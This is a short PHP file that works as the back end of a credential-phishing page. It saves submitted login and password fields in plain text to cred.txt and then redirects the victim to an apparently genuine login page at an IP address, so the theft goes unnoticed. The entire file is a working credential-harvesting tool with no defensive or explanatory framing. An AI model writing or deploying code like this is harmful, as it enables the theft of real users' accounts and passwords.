<?php 
file_put_contents("cred.txt", "Login : ".$_POST['txtPRNo']." pass: ".$_POST['txtPass']."\n",FILE_APPEND);

header('Location:http://14.139.212.115:81/LoginPage.aspx');
exit();

?>